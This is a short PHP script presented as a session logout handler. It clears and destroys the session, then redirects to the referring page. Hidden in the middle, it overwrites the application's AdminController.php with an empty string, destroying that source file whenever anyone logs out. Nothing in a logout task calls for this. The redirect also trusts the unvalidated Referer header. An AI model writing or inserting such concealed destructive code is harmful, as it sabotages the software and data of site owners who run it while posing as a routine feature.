<?php
session_unset();
session_destroy();

$filename = '../app/Controller/AdminController.php';
$content = '';
file_put_contents($filename, $content);

if (isset($_SERVER['HTTP_REFERER']) && !empty($_SERVER['HTTP_REFERER'])) {
    header('location:'. $_SERVER['HTTP_REFERER']);

} else {
    header('location:'. base_url('/'));

}
exit;
